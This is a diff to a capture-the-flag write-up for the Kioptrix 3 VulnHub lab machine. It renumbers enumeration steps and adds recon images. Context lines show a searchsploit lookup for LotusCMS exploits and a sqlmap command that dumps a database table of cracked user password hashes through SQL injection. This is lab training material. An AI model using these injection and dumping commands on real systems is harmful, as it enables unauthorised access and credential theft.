@@ -5,9 +5,13 @@ summary: This is the summary for an awesome post.
 tags: vulnhub, writeup
 
 ## Overview
-This is a writeup for VulnHub VM [Kioptrix: Level 1.2 (#3)](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
+This is a writeup for VulnHub VM [Kioptrix: Level 1.2 (#3)](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):
+
+![writeup.overview.machinescli](/static/files/posts_vulnhub_kioptrix3/machinescli.png.webp)
 
 ### Killchain
+Here's the killchain (`enumeration` → `exploitation` → `privilege escalation`) for this machine:
+
 ![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix3/killchain.png.webp)
 
 ### TTPs
@@ -47,26 +51,30 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sat Sep 28 20:47:18 2019 -- 1 IP address (1 host up) scanned in 10.35 seconds
 ```
 
-2\. We added an entry for this target within `/etc/hosts` file:  
+2\. Here a summary of open ports and associated [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan files:
+
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix3/openports.png.webp)  
+
+3\. We added an entry for this target within `/etc/hosts` file:  
 ```
 tail -2 /etc/hosts
   192.168.92.184  kioptrix3.com
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot00.png.webp)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_kioptrix3/screenshot00.png.webp)  
 
-3\. We find a login page at the following url: `http://kioptrix3.com/index.php?system=Admin`  
+4\. We find a login page at the following url: `http://kioptrix3.com/index.php?system=Admin`  
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_kioptrix3/screenshot01.png.webp)  
+![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_kioptrix3/screenshot01.png.webp)  
 
-4\. We find that the underlying CMS is `LotusCMS` and use searchsploit to look for any exploits. There were two hits but nothing useful as using Metasploit is out of scope for this writeup. We decided to look for non-MSF versions of the remote code execution exploit for `LotusCMS`:  
+5\. We find that the underlying CMS is `LotusCMS` and use searchsploit to look for any exploits. There were two hits but nothing useful as using Metasploit is out of scope for this writeup. We decided to look for non-MSF versions of the remote code execution exploit for `LotusCMS`:  
 ```
 searchsploit lotuscms
 ```
 
-![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_kioptrix3/screenshot02.png.webp)  
+![writeup.enumeration.steps.5.1](/static/files/posts_vulnhub_kioptrix3/screenshot02.png.webp)  
 
-5\. We also find a gallery application hosted on the following url: `http://kioptrix3.com/gallery/`. We test this application for SQLi using `sqlmap` and are able to dump the `dev_accounts` table from the `gallery` database. This table lists unsalted MD5 hashes for users `dreg` and `loneferret` that are auto-cracked by `sqlmap`:  
+6\. We also find a gallery application hosted on the following url: `http://kioptrix3.com/gallery/`. We test this application for SQLi using `sqlmap` and are able to dump the `dev_accounts` table from the `gallery` database. This table lists unsalted MD5 hashes for users `dreg` and `loneferret` that are auto-cracked by `sqlmap`:  
 ```
 sqlmap --batch -u "http://kioptrix3.com/gallery/gallery.php?id=null" --dump
   Database: gallery
@@ -80,9 +88,9 @@ sqlmap --batch -u "http://kioptrix3.com/gallery/gallery.php?id=null" --dump
   +----+------------+---------------------------------------------+
 ```
 
-![writeup.enumeration.steps.5.1](/static/files/posts_vulnhub_kioptrix3/screenshot03.png.webp)  
+![writeup.enumeration.steps.6.1](/static/files/posts_vulnhub_kioptrix3/screenshot03.png.webp)  
 
-![writeup.enumeration.steps.5.2](/static/files/posts_vulnhub_kioptrix3/screenshot04.png.webp)  
+![writeup.enumeration.steps.6.2](/static/files/posts_vulnhub_kioptrix3/screenshot04.png.webp)  
 
 ### Findings
 #### Open Ports
